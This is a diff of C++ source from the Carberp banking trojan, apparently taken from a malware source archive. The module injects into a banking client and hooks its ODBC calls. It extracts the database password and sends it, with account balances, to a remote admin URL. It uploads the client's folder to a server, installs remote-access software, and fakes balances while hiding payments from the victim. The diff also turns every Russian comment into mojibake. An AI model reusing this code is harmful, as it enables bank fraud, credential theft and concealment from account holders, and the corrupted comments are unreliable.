@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "BBSCBank.h"
 //#include <windows.h>
 //#include <wininet.h>
@@ -28,48 +39,48 @@ namespace BBS_CALC
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define DBG BBS_CALC::DBGOutMessage<>
 
 
 namespace CBank
 {
 
-//какой остаток должен быть для указанного счета
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 struct RestAccount
 {
-	char account[32]; //если account[0] = 0, то конец массива
-	TIMESTAMP_STRUCT date; //после какой даты
-	DWORD diff; //на сколько нужно увеличить остаток 
+	char account[32]; //пїЅпїЅпїЅпїЅ account[0] = 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	TIMESTAMP_STRUCT date; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	DWORD diff; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
 };
 
-//в какие даты были изменены остатки c балансами которые там были
+//пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ c пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 struct RestAccountFixed
 {
 	char account[32]; 
-	TIMESTAMP_STRUCT date; //дата остатка
-	DWORD openingBalance; //баланс на начало
-	DWORD closingBalance; //баланс на конец
+	TIMESTAMP_STRUCT date; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD openingBalance; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD closingBalance; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 };
 
-//скрываемые платежки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct HidePayment
 {
 	char account[32];
-	char num[16]; //номер документа
-	DWORD amount; //сумма
-	TIMESTAMP_STRUCT date; //дата платежки
+	char num[16]; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	DWORD amount; //пїЅпїЅпїЅпїЅпїЅ
+	TIMESTAMP_STRUCT date; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-static RestAccount restAccounts[10]; //подмена баланса
-static RestAccountFixed* restFixeds = 0; //значения балансов до подмены (каждый день после подменяемой даты)
-static DWORD sizeRestFixeds = 0; //количество памяти занимаемой restFixeds
-static HidePayment hidePayments[10]; //скрываемые платежки
-static bool runHideReplacement = false; //true - если надо провести подмену скрытие
+static RestAccount restAccounts[10]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static RestAccountFixed* restFixeds = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ)
+static DWORD sizeRestFixeds = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ restFixeds
+static HidePayment hidePayments[10]; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+static bool runHideReplacement = false; //true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-static DWORD WINAPI SendCBank( void* param ); //отсылка файлов CBank на сервер
-static DWORD WINAPI InstallFakeDll(void*); //установка fake.dll
-static DWORD WINAPI ThreadHideReplacement(void*); //подмена баланса и скрытие платежек
+static DWORD WINAPI SendCBank( void* param ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ CBank пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+static DWORD WINAPI InstallFakeDll(void*); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ fake.dll
+static DWORD WINAPI ThreadHideReplacement(void*); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 SQLRETURN (WINAPI *pHandlerSQLDriverConnectA)(
      SQLHDBC         ConnectionHandle,
@@ -85,7 +96,7 @@ SQLRETURN (WINAPI *pHandlerSQLPrepareA)( SQLHSTMT StatementHandle, SQLCHAR* Stat
 SQLRETURN (WINAPI *pHandlerSQLExecDirectA)( SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength );
 SQLRETURN (WINAPI *pHandlerSQLExecute)( SQLHSTMT StatementHandle );
 
-//извлекает подстроку между символами c, номер подстроки указывается в num
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ c, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ num
 static char* GetPieceString( const char* s, char c, int num, char* to, int c_to );
 
 static char strODBCConnect[MAX_PATH];
@@ -93,7 +104,7 @@ static char domain[128];
 
 static void ReadReplacement( const char* s );
 ////////////////////////////////////////////////////////
-// функции управления базой данных
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //////////////////////////////////////////////////////////
 static void CloseDB( ODBC* DB )
 {
@@ -128,7 +139,7 @@ static char* GetAdminUrl( char* url )
 }
 
 /////////////////////////////////////////////////////////////////////
-// Хуки
+// пїЅпїЅпїЅпїЅ
 /////////////////////////////////////////////////////////////////////
 
 static SQLRETURN WINAPI HandlerSQLDriverConnectA( SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString,
@@ -161,12 +172,12 @@ static bool InitData()
 	return true;
 }
 
-//грабит баланс и отправляет в админку
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static DWORD WINAPI GrabAndSendBalance(void*)
 {
-	DBG( "CBank", "Ждем строки подключения к базе" );
+	DBG( "CBank", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ" );
 	while( strODBCConnect[0] == 0 ) pSleep(1000);
-	pSleep(5000); //после получения строки немного подождем на всякий случай
+	pSleep(5000); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	ODBC* DB = CreateDB();
 	if( DB )
 	{
@@ -178,46 +189,46 @@ static DWORD WINAPI GrabAndSendBalance(void*)
 		{
 			DBG( "CBank", "Rest=%s, Account=%s", Rest, Account );
 			DB->CloseQuery(qr);
-			//извлекаем пароль
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			char pwd[64]; pwd[0] = 0;
 			char* p = m_strstr( strODBCConnect, "PWD=" );
 			if( p )
 			{
-				p += 4; //переходим на сам пароль
+				p += 4; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				char* p2 = p;
-				while( *p2 && *p2 != ';' ) p2++; //ищем конец пароля
+				while( *p2 && *p2 != ';' ) p2++; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				int len = p2 - p;
 				m_memcpy( pwd, p, len );
 				pwd[len] = 0;
 			}
-			DBG( "CBank", "Пароль='%s'", pwd );
+			DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅ='%s'", pwd );
 			fwsprintfA pwsprintfA = Get_wsprintfA();
 			MemPtr<512> qr;
 			string user = GetAzUser();
 			pwsprintfA( qr.str(), "http://%s/set/bal.html?uid=%s&type=bss&sum=%s&acc=%s&pass=%s&cid=%s", domain, BOT_UID, Rest, Account, pwd, user.t_str() );
-			DBG( "CBank", "Отсылаем запрос %s", qr.str() );
+			DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %s", qr.str() );
 			THTTPResponseRec Response;
 			ClearStruct(Response);
 			HTTP::Get( qr, 0, &Response );
 			HTTPResponse::Clear(&Response);
 		}
 		else
-			DBG( "CBank", "Запрос не выполнился" );
+			DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		CloseDB(DB);
 	}
 	else
-		DBG( "CBank", "Не удалось подключиться к базе" );
+		DBG( "CBank", "пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ" );
 	return 0;
 }
 
-//поток исполняющийся внутри cbank.exe (cbmain.ex)
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ cbank.exe (cbmain.ex)
 static DWORD WINAPI WorkInCBank(void*)
 {
 	BOT::Initialize(ProcessUnknown);
 	if( !InitData() ) return 0;
 	char folderCBank[MAX_PATH];
 	pGetModuleFileNameA( 0, folderCBank, sizeof(folderCBank) );
-	DBG( "CBank", "Заинжектились в процесс '%s'", folderCBank );
+	DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ '%s'", folderCBank );
 	SetHooks();
 	StartThread( GrabAndSendBalance, 0 );
 	RunThread( ThreadHideReplacement, 0 );
@@ -253,10 +264,10 @@ static DWORD IsRunBClient( char* path )
 	return ret;
 }
 
-//поток ждет запуска cbank.exe (через rootkit не ловится)
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ cbank.exe (пїЅпїЅпїЅпїЅпїЅ rootkit пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 static void WINAPI WaitRunCBank(void*)
 {
-	DBG( "СBank", "WaitRunCBank" );
+	DBG( "пїЅBank", "WaitRunCBank" );
 	DWORD idCBank = 0;
 	char path[MAX_PATH];
 	path[0] = 0;
@@ -277,7 +288,7 @@ static void WINAPI WaitRunCBank(void*)
 #ifdef AmmyyH
 				Ammyy::Install(false);
 #endif 
-				VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
+				VideoProcess::SetAutorun(true); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				VideoProcess::ConnectToServer(0);
 			}
 		}
@@ -301,24 +312,24 @@ static DWORD WINAPI SendCBank( void* param )
 	char folderCBank[MAX_PATH];
 	m_lstrcpy( folderCBank, (char*)param );
 	STR::Free((char*)param);
-	//в param передается путь к ехе клиента, папка клиента на два уровня выше 
+	//пїЅ param пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ 
 	pPathRemoveFileSpecA(folderCBank);
 	pPathRemoveFileSpecA(folderCBank);
 	const char* CBankFlagCopy = "cbank_copy.txt";
 	if( Bot->FileExists( 0, CBankFlagCopy ) )
 	{
-		DBG( "CBank", "Клиент уже был скопирован" );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
 	DWORD folderSize = 0;
 	if( !SizeFolderLess( CBankFlagCopy, 1024*1024*250, &folderSize ) )
 	{
-		DBG( "CBank", "Папка программы больше заданного размера, не копируем" );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
-	DBG( "CBank", "запуск отсылки программы на сервер из папки %s", folderCBank );
+	DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", folderCBank );
 
-//	DBG( "IFobs", "Размер папки %d байт", folderSize );
+//	DBG( "IFobs", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %d пїЅпїЅпїЅпїЅ", folderSize );
 	char tempFolder[MAX_PATH];
 	const char* clientPrg = "CBankClient";
 	pGetTempPathA( sizeof(tempFolder), tempFolder );
@@ -327,24 +338,24 @@ static DWORD WINAPI SendCBank( void* param )
 	STR::Free(cryptName);
 	if( VideoProcess::FolderIsUpload( clientPrg, tempFolder ) )
 	{
-		DBG( "CBank", "Эта папка на данный момент выкачивается" );
+		DBG( "CBank", "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
-	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2-пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "\0\0"
 	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
 	pCreateDirectoryA( tempFolder, 0 );
-	DBG( "CBank", "Копирование во временную папку %s", tempFolder );
+	DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", tempFolder );
 	*((int*)&(folderCBank[ m_lstrlen(folderCBank) ])) = 0; 
 	CopyFileANdFolder( folderCBank, tempFolder );
-	DBG( "CBank", "Копирование на сервер" );
-	//удаляем ненужные папки
+	DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	const char* DelFolders[] = { 0 };
 	int i = 0;
 	while( DelFolders[i] )
 	{
 		pPathAppendA( tempFolder, DelFolders[i] );
 		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
-		DBG( "CBank", "Удаление папки %s", tempFolder );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", tempFolder );
 		DeleteFolders(tempFolder);
 		pPathRemoveFileSpecA(tempFolder);
 		*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0;
@@ -353,15 +364,15 @@ static DWORD WINAPI SendCBank( void* param )
 	VideoProcess::SendFiles( 0, clientPrg, tempFolder );
 	DeleteFolders(tempFolder);
 	Bot->CreateFileA( 0, CBankFlagCopy );
-	DBG( "CBank", "Копирование на сервер окончено" );
+	DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 	return 0;
 }
 
 ////////////////////////////////////////////////////////////////////
-//Разные вспомогательные функции
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 ////////////////////////////////////////////////////////////////////
 
-//извлекает подстроку между символами c, номер подстроки указывается в num
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ c, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ num
 static char* GetPieceString( const char* s, char c, int num, char* to, int c_to )
 {
 	*to = 0;
@@ -387,12 +398,12 @@ static char* GetPieceString( const char* s, char c, int num, char* to, int c_to 
 	return ret;
 }
 
-//переводит сумму в целочисленное число, два последних числа это копейки, останавливается на символе которого
-//не может быть в числе, в len будет количество прочитанных символов (символов в числе)
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ len пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ)
 static int SumToInt( const char* s, int* len )
 {
 	int v = 0;
-	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
+	int kop = -1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	const char* p = s;
 	while( *s == ' ' ) s++;
 	while( (*s >= '0' && *s <= '9') || *s == '.'  )
@@ -406,14 +417,14 @@ static int SumToInt( const char* s, int* len )
 		}
 		s++;
 	}
-	//добавляем нули в конце чтобы всегда в копейках было две цифры
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if( kop < 0 ) kop = 0;
 	for( int i = kop; i < 2; i++ ) v *= 10; 
 	if( len ) *len = s - p;
 	return v;
 }
 
-//текст в число, до 1-го не числового символа
+//пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ 1-пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int ValueToInt( const char* s, int* len )
 {
 	int v = 0;
@@ -428,7 +439,7 @@ static int ValueToInt( const char* s, int* len )
 	return v;
 }
 
-//чтение даты в формате dd.mm.yyyy hh:mm:ss, возвращает количество считанных символов
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ dd.mm.yyyy hh:mm:ss, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int ReadDate( const char* s, TIMESTAMP_STRUCT* date )
 {
 	m_memset( date, 0, sizeof(TIMESTAMP_STRUCT) );
@@ -467,54 +478,54 @@ static int ReadString( const char* s, char* buf )
 }
 
 
-//считывает строку вида
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //"40702810300010100847 4.82 25.11.2012 10:11: 12, 40702810300010100847 1000.00 27.11.2012; 40702810300010100847 675 26.11.2012, 40702810300010100847 678 28.11.20012";
-//где через запятую перечисляются балансы для подмены: счет сумма дата
-//после точки с запятой идут скрываемые платежки (через запятую): счет номер платежки дата
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ): пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 static void ReadReplacement( const char* s )
 {
-	//чтение остатка
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int n = 0;
 	while( *s )
 	{
-		//считываем счет
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		s += ReadString( s, restAccounts[n].account );
-		//сумма
+		//пїЅпїЅпїЅпїЅпїЅ
 		int len;
 		restAccounts[n].diff = SumToInt( s, &len );
 		s += len;
-		//дата
+		//пїЅпїЅпїЅпїЅ
 		s += ReadDate( s, &restAccounts[n].date );
-		DBG( "CBank", "Подмена баланса для счета: %s, разница: %d", restAccounts[n].account, restAccounts[n].diff );
-		DBG( "CBank", "Дата %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %d", restAccounts[n].account, restAccounts[n].diff );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅ %02d.%02d.%02d", restAccounts[n].date.day, restAccounts[n].date.month, restAccounts[n].date.year );
 		while( *s == ' ' ) s++;
 		n++;
 		if( n >= ARRAYSIZE(restAccounts) - 1 ) break;
 		if( *s++ == ';' ) break;
 	}
-	restAccounts[n].account[0] = 0; //конец массива
+	restAccounts[n].account[0] = 0; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	n = 0;
 	while( *s )
 	{
-		//считываем счет
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		s += ReadString( s, hidePayments[n].account );
-		//номер платежки
+		//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		s += ReadString( s, hidePayments[n].num );
 		s += ReadDate( s, &hidePayments[n].date );
 		while( *s == ' ' ) s++;
-		DBG( "CBank", "Скрытие платежки: %s %s", hidePayments[n].account, hidePayments[n].num );
-		DBG( "CBank", "Дата %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %s %s", hidePayments[n].account, hidePayments[n].num );
+		DBG( "CBank", "пїЅпїЅпїЅпїЅ %02d.%02d.%02d", hidePayments[n].date.day, hidePayments[n].date.month, hidePayments[n].date.year );
 		n++;
 		if( *s == 0 || n >= ARRAYSIZE(hidePayments) - 1 ) break;
 		s++;
 	}
